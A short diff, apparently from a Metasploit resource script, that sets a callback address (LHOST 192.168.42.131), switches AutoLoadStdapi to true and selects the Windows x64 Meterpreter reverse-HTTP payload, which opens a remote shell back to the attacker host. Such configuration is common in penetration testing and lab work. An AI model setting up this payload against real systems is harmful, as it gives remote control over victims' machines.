@@ -2,7 +2,7 @@
  setg LHOST 192.168.42.131
 
 
- setg AutoLoadStdapi false
+ setg AutoLoadStdapi true
 
  use payload/windows/x64/meterpreter_reverse_http
  
